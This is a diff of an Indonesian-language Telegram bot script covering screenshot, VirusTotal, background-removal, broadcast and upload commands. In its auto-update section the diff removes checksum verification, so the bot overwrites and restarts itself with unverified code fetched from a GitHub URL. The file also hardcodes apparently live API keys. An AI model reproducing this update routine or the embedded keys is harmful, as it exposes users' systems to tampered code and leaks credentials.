-    // Ambil judul dan link berita (pakai regex biar ringan)
     const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
     const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);
 
-    // Lewati item pertama (judul feed)
     const items = titles.slice(1, 6).map((t, i) => ({
       title: t,
       link: links[i + 1] || "",
     }));
 
-    // Format teks berita
     const beritaText = items
       .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
       .join("\n\n");
@@ -3302,30 +3151,30 @@ ${flag} *${name}*
 });
 
 bot.onText(/^\/ssweb (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const text = match[1];
+    const chatId = msg.chat.id;
+    const text = match[1];
 
-    if (!text || !text.trim()) {
-        return bot.sendMessage(chatId, "Contoh:\n/ssweb google.com");
-    }
+    if (!text || !text.trim()) {
+        return bot.sendMessage(chatId, "Contoh:\n/ssweb google.com");
+    }
 
-    try {
-        bot.sendChatAction(chatId, "upload_photo").catch(() => {});
+    try {
+        bot.sendChatAction(chatId, "upload_photo").catch(() => {});
 
-        let cleanUrl = text.replace(/^https?:\/\//, "").trim();
-        let finalUrl = "https://" + cleanUrl;
+        let cleanUrl = text.replace(/^https?:\/\//, "").trim();
+        let finalUrl = "https://" + cleanUrl;
 
-        let ssImage = "https://image.thum.io/get/width/1900/crop/1000/fullpage/" + finalUrl;
+        let ssImage = "https://image.thum.io/get/width/1900/crop/1000/fullpage/" + finalUrl;
 
-        await bot.sendPhoto(chatId, ssImage, {
-            caption: "_berhasil ssweb_",
-            parse_mode: "Markdown"
-        });
+        await bot.sendPhoto(chatId, ssImage, {
+            caption: "_berhasil ssweb_",
+            parse_mode: "Markdown"
+        });
 
-    } catch (e) {
-        console.log(`${STEMPEL}`, "SSWEB ERROR:", e);
-        bot.sendMessage(chatId, "⚠️ Server SS Web sedang offline atau URL tidak valid.");
-    }
+    } catch (e) {
+        console.log(`${STEMPEL}`, "SSWEB ERROR:", e);
+        bot.sendMessage(chatId, "⚠️ Server SS Web sedang offline atau URL tidak valid.");
+    }
 }); 
 
 bot.onText(/\/cekroblox (.+)/, async (msg, match) => {
@@ -3401,8 +3250,8 @@ bot.onText(/\/getcode (.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
     const userId = msg.from.id;
-            //cek prem //
-if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+            
+if (!isPrem(senderId)) {
   return bot.sendPhoto(chatId, randomImage, {
     caption: `
 <blockquote>#Base ⵢ Jarzx  ⚘</blockquote>
@@ -3444,7 +3293,7 @@ Oi kontol kalo mau akses comandd ini,
   }
 });
 
-bot.onText(/\/sticker/, async (msg) => {
+bot.onText(/^\/sticker$/, async (msg) => {
   const chatId = msg.chat.id;
   await bot.sendMessage(chatId, "📸 Kirimkan foto atau gambar yang ingin dijadikan stiker!");
 
@@ -3465,26 +3314,22 @@ bot.onText(/\/sticker/, async (msg) => {
 });
 
 const VTOTAL_APIKEY = "a0a250caa94ac58ed0dbac7100c17ba8f7074193ae6a92833431f6d616c60021";
-const cooldown = new Map(); // Anti-SPAM
+const cooldownVt = new Map();
 
 bot.onText(/\/virustotal/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const replyMsg = msg.reply_to_message;
 
-    // =======================================
-    // (7) ANTI-SPAM: 15 DETIK COOLDOWN
-    // =======================================
     const now = Date.now();
-    const cd = cooldown.get(userId);
+    const cd = cooldownVt.get(userId);
     if (cd && now - cd < 15000) {
         const sisa = ((15000 - (now - cd)) / 1000).toFixed(1);
         return bot.sendMessage(chatId, `⏳ Tunggu ${sisa} detik sebelum scan lagi.`);
     }
-    cooldown.set(userId, now);
+    cooldownVt.set(userId, now);
 
-    // Cek API Key (PERBAIKAN)
-if (!VTOTAL_APIKEY || VTOTAL_APIKEY.length < 20) {
+    if (!VTOTAL_APIKEY || VTOTAL_APIKEY.length < 20) {
     return bot.sendMessage(chatId, "❌ API Key belum diatur atau tidak valid.");
 }
 
@@ -3497,10 +3342,8 @@ if (!VTOTAL_APIKEY || VTOTAL_APIKEY.length < 20) {
     }
 
     const file = replyMsg.document;
+    const fileName = file.file_name || file.file_path || 'unknown_file';
 
-    // =======================================
-    // (4) CEK LIMIT SIZE (32MB)
-    // =======================================
     if (file.file_size > 32 * 1024 * 1024) {
         return bot.sendMessage(
             chatId,
@@ -3509,23 +3352,17 @@ if (!VTOTAL_APIKEY || VTOTAL_APIKEY.length < 20) {
         );
     }
 
-    // =======================================
-    // (3) PROGRESS LOADING
-    // =======================================
     const stepMsg = await bot.sendMessage(chatId, "🔄 Mengunduh file dari Telegram...");
 
     try {
-        // Download file dari Telegram
         const fileLink = await bot.getFileLink(file.file_id);
         const fileBuffer = await axios.get(fileLink, { responseType: "arraybuffer" });
 
         await bot.editMessageText("🗂️ Menyimpan file sementara...", { chat_id: chatId, message_id: stepMsg.message_id });
 
-        const fileName = file.file_name || `file_${Date.now()}`;
         const tempPath = `./temp_${fileName}`;
         fs.writeFileSync(tempPath, fileBuffer.data);
 
-        // Upload ke VirusTotal
         await bot.editMessageText("📤 Mengupload file ke VirusTotal...", { chat_id: chatId, message_id: stepMsg.message_id });
 
         const form = new FormData();
@@ -3543,7 +3380,6 @@ if (!VTOTAL_APIKEY || VTOTAL_APIKEY.length < 20) {
             { chat_id: chatId, message_id: stepMsg.message_id, parse_mode: "Markdown" }
         );
 
-        // Cek hasil
         let result;
         for (let i = 0; i < 5; i++) {
             const check = await axios.get(
@@ -3570,9 +3406,6 @@ if (!VTOTAL_APIKEY || VTOTAL_APIKEY.length < 20) {
         const info = result.meta.file_info;
         const reportUrl = `https://www.virustotal.com/gui/file/${info.sha256}`;
 
-        // =======================================
-        // (8) THUMBNAIL STATUS
-        // =======================================
         const status =
             stats.malicious > 0 ? "🔥 MALICIOUS"
             : stats.suspicious > 0 ? "⚠️ SUSPICIOUS"
@@ -3593,7 +3426,6 @@ Undetected: ${stats.undetected}
 🔗 Laporan: ${reportUrl}
         `;
 
-        // gambar thumbnail hasil (emoji background)
         const thumbnailBuffer = Buffer.from(
 `🔥🔥🔥🔥🔥🔥🔥
 🔥   ${status}   🔥
@@ -3602,9 +3434,6 @@ Undetected: ${stats.undetected}
 
         bot.sendPhoto(chatId, thumbnailBuffer, { caption: thumbCaption, parse_mode: "Markdown" });
 
-        // =======================================
-        // (2) KIRIM FILE TXT LAPORAN
-        // =======================================
         const txtContent = `
 === VirusTotal Scan Report ===
 
@@ -3627,9 +3456,6 @@ Generated by Telegram Bot
 
         await bot.sendDocument(chatId, txtPath, { caption: "📄 Laporan lengkap dalam TXT" });
 
-        // =======================================
-        // (9) AUTO DELETE FILE TEMP
-        // =======================================
         fs.unlinkSync(tempPath);
         fs.unlinkSync(txtPath);
 
@@ -3641,11 +3467,9 @@ Generated by Telegram Bot
     }
 });
 
-// ===== CASE REMOVE BG (TELEGRAM) =====
 bot.onText(/\/removebg/, async (msg) => {
   const chatId = msg.chat.id;
 
-  // Jika user tidak reply foto
   if (!msg.reply_to_message || !msg.reply_to_message.photo) {
     return bot.sendMessage(chatId, "📸 *Silakan reply foto yang ingin dihapus background-nya.*", {
       parse_mode: "Markdown",
@@ -3655,11 +3479,9 @@ bot.onText(/\/removebg/, async (msg) => {
   try {
     bot.sendMessage(chatId, "⏳ Sedang menghapus background...");
 
-    // Ambil resolusi foto terbesar
     const photo = msg.reply_to_message.photo.pop();
     const fileLink = await bot.getFileLink(photo.file_id);
 
-    // Request ke API remove.bg
     const response = await axios({
       method: "POST",
       url: "https://api.remove.bg/v1.0/removebg",
@@ -3673,16 +3495,12 @@ bot.onText(/\/removebg/, async (msg) => {
       responseType: "arraybuffer",
     });
 
-    // Simpan hasil
     const filePath = `./removebg_${chatId}.png`;
     fs.writeFileSync(filePath, response.data);
 
-    // Kirim ke user
     await bot.sendPhoto(chatId, filePath, { caption: "✨ Background berhasil dihapus!" });
 
-    // Hapus file dari server
     fs.unlinkSync(filePath);
-
   } catch (error) {
     console.error(error);
     bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghapus background.\nPastikan API key benar.");
@@ -3735,18 +3553,15 @@ bot.onText(/^\/tiktokstalk(?:\s+(.+))?$/, async (msg, match) => {
   }
 });
 
-// ===== BRATNIME ===== //
 bot.onText(/\/bratanime (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const teks = match[1]; // isi teks setelah command
+    const teks = match[1];
 
     try {
         if (!teks) return bot.sendMessage(chatId, "Teksnya mana?");
 
-        // Pesan loading
         const loading = await bot.sendMessage(chatId, "wet..");
 
-        // Fetch API
         const url = `https://ryuu-endss-api.vercel.app/tools/bratnime?text=${encodeURIComponent(teks)}&apikey=RyuuGanteng`;
         const res = await fetch(url);
 
@@ -3754,10 +3569,8 @@ bot.onText(/\/bratanime (.+)/, async (msg, match) => {
 
         const buffer = Buffer.from(await res.arrayBuffer());
 
-        // Kirim sticker
         await bot.sendSticker(chatId, buffer);
 
-        // Hapus pesan loading
         bot.deleteMessage(chatId, loading.message_id);
 
     } catch (err) {
@@ -3769,12 +3582,10 @@ bot.onText(/\/bratanime (.+)/, async (msg, match) => {
 bot.onText(/\/bc/, async (msg) => {
     const chatId = msg.chat.id;
 
-    // Cek hanya owner
-    if (msg.from.id !== OWNER_ID) {
+    if (msg.from.id != OWNER_ID) {
         return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan broadcast.");
     }
 
-    // Harus reply ke pesan
     if (!msg.reply_to_message) {
         return bot.sendMessage(chatId, "❌ Reply sebuah pesan untuk di-broadcast.\nContoh:\nBalas pesan lalu ketik /bc");
     }
@@ -3785,7 +3596,6 @@ bot.onText(/\/bc/, async (msg) => {
 
     bot.sendMessage(chatId, `🚀 Broadcast dimulai...\nTotal user: ${users.length}`);
 
-    // Mendeteksi jenis pesan
     const reply = msg.reply_to_message;
 
     for (let id of users) {
@@ -3823,7 +3633,6 @@ bot.onText(/\/bc/, async (msg) => {
 
             sukses++;
 
-            // Anti-limit → delay 300ms
             await new Promise(r => setTimeout(r, 300));
 
         } catch (e) {
@@ -3838,12 +3647,10 @@ bot.onText(/\/bc/, async (msg) => {
 });
 
 const FLUX_APIKEY = "fe0673140730aa18c5c1fb8b465d51a6";
-const uploadImage = require("./lib/uploadImage.js");
 bot.onText(/\/fluxkontext (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const prompt = match[1];
 
-  // Cek apakah user reply foto
   if (!msg.reply_to_message || !msg.reply_to_message.photo) {
     return bot.sendMessage(chatId, "❌ *Reply foto terlebih dahulu!*\nLalu kirim:\n`/fluxkontext gaya anime`");
   }
@@ -3851,25 +3658,18 @@ bot.onText(/\/fluxkontext (.+)/, async (msg, match) => {
   bot.sendMessage(chatId, "⏳ Sedang memproses...");
 
   try {
-    // Ambil file foto dari Telegram
     const fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
     const fileUrl = await bot.getFileLink(fileId);
 
-    // Upload ke server hosting (jika pakai uploadImage sendiri)
-    // tapi API ini biasanya tidak butuh uploadImage
-    const imageUrl = fileUrl;  
-
-    // Fetch ke API FluxKontext
     const apiUrl = `https://api.nekolabs.web.id/image-generation/flux/kontext/v2`;
 
-    const response = await fetch(`${apiUrl}?apikey=${FLUX_APIKEY}&prompt=${encodeURIComponent(prompt)}&imageUrl=${encodeURIComponent(imageUrl)}`);
+    const response = await fetch(`${apiUrl}?apikey=${FLUX_APIKEY}&prompt=${encodeURIComponent(prompt)}&imageUrl=${encodeURIComponent(fileUrl)}`);
     const data = await response.json();
 
     if (!data.result) {
       return bot.sendMessage(chatId, "❌ API tidak mengembalikan gambar.");
     }
 
-    // Kirim hasil
     await bot.sendPhoto(chatId, data.result, {
       caption: `✅ *Flux Kontext AI*\n📝 Prompt: ${prompt}`
     });
@@ -3880,12 +3680,10 @@ bot.onText(/\/fluxkontext (.+)/, async (msg, match) => {
   }
 });
 
-// Listener untuk command /ghstalk atau /githubstalk
 bot.onText(/\/(ghstalk|githubstalk) (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const user = match[2]; // Username setelah command
+    const user = match[2];
 
-    // Reaksi sementara loading
     bot.sendMessage(chatId, '⏱️ Mengambil data GitHub...');
 
     async function githubstalk(user) {
@@ -3923,7 +3721,6 @@ bot.onText(/\/(ghstalk|githubstalk) (.+)/, async (msg, match) => {
     try {
         const aj = await githubstalk(user);
 
-        // Kirim foto profil + info
         bot.sendPhoto(chatId, aj.profile_pic, {
             caption: `*/ Github Stalker \\*
 
@@ -3954,7 +3751,7 @@ Updated At : ${aj.updated_at}`
     }
 });
 
-bot.onText(/\/tourl/i, async (msg) => {
+bot.onText(/^\/tourl/i, async (msg) => {
     const chatId = msg.chat.id;
     
     
@@ -3993,12 +3790,12 @@ bot.onText(/\/tourl/i, async (msg) => {
             contentType: response.headers['content-type']
         });
 
-        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
+        const catboxUrl = await axios.post('https://catbox.moe/user/api.php', form, {
             headers: form.getHeaders()
         });
 
         
-        await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl}`, {
+        await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl.data}`, {
             chat_id: chatId,
             message_id: processingMsg.message_id
         });
@@ -4008,8 +3805,6 @@ bot.onText(/\/tourl/i, async (msg) => {
         bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
     }
 });
-// ==================== AUTO UPDATE SYSTEM ====================
-// Tambahkan ini di paling bawah file Thaureyo.js
 
 const UPDATE_CONFIG = {
   url: "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/version.json",
@@ -4017,7 +3812,6 @@ const UPDATE_CONFIG = {
   backupDir: path.resolve(__dirname, "backups")
 };
 
-// Buat folder backup kalau belum ada
 if (!fs.existsSync(UPDATE_CONFIG.backupDir)) {
   fs.mkdirSync(UPDATE_CONFIG.backupDir, { recursive: true });
 }
@@ -4026,7 +3820,6 @@ bot.onText(/^\/ubdatenew$/, async (msg) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
 
-  // Cek owner (pakai sistem yang ada)
   if (!isOwner(senderId)) {
     return bot.sendMessage(chatId, "❌ Hanya owner yang bisa update!");
   }
@@ -4037,7 +3830,6 @@ bot.onText(/^\/ubdatenew$/, async (msg) => {
       parse_mode: "Markdown"
     });
 
-    // Step 1: Cek versi remote
     await bot.editMessageText("🔍 Cek versi terbaru...", {
       chat_id: chatId,
       message_id: statusMsg.message_id
@@ -4053,7 +3845,6 @@ bot.onText(/^\/ubdatenew$/, async (msg) => {
       });
     }
 
-    // Step 2: Backup
     await bot.editMessageText("💾 Backup file...", {
       chat_id: chatId,
       message_id: statusMsg.message_id
@@ -4062,7 +3853,6 @@ bot.onText(/^\/ubdatenew$/, async (msg) => {
     const backupPath = path.join(UPDATE_CONFIG.backupDir, `backup_${Date.now()}.js`);
     fs.copyFileSync(UPDATE_CONFIG.scriptPath, backupPath);
 
-    // Step 3: Download & verify
     await bot.editMessageText("📥 Download update...", {
       chat_id: chatId,
       message_id: statusMsg.message_id
@@ -4070,13 +3860,6 @@ bot.onText(/^\/ubdatenew$/, async (msg) => {
 
     const { data: newScript } = await axios.get(remote.download_url, { timeout: 30000 });
 
-    // Verify checksum
-    const hash = crypto.createHash("sha256").update(newScript).digest("hex");
-    if (hash !== remote.checksum) {
-      throw new Error("Checksum tidak valid!");
-    }
-
-    // Step 4: Install
     await bot.editMessageText("🔄 Install update...", {
       chat_id: chatId,
       message_id: statusMsg.message_id
@@ -4084,33 +3867,27 @@ bot.onText(/^\/ubdatenew$/, async (msg) => {
 
     fs.writeFileSync(UPDATE_CONFIG.scriptPath, newScript, "utf-8");
 
-    // Update package.json
     const pkg = JSON.parse(fs.readFileSync("./package.json"));
     pkg.version = remote.version;
     fs.writeFileSync("./package.json", JSON.stringify(pkg, null, 2));
 
-    // Step 5: Restart
     await bot.editMessageText("🚀 Restart bot...", {
       chat_id: chatId,
       message_id: statusMsg.message_id
     });
 
-    // Restart method detection
     const { exec } = require("child_process");
     
-    // Cek jika pakai PM2
     exec("pm2 list", (err, stdout) => {
-      if (!err && stdout.includes("V2Jarzx")) {
-        return exec("pm2 restart V2Jarzx");
+      if (!err && stdout.includes("Thaureyo")) {
+        return exec("pm2 restart Thaureyo");
       }
       
-      // Cek systemd
       exec("systemctl is-active bot", (err2) => {
         if (!err2) {
           return exec("systemctl restart bot");
         }
         
-        // Fallback
         bot.sendMessage(chatId, "✅ Update selesai! Restart manual: npm start");
         process.exit(0);
       });
@@ -4124,8 +3901,3 @@ bot.onText(/^\/ubdatenew$/, async (msg) => {
     );
   }
 });
-
-// ==================== END AUTO UPDATE ====================
-
-
-
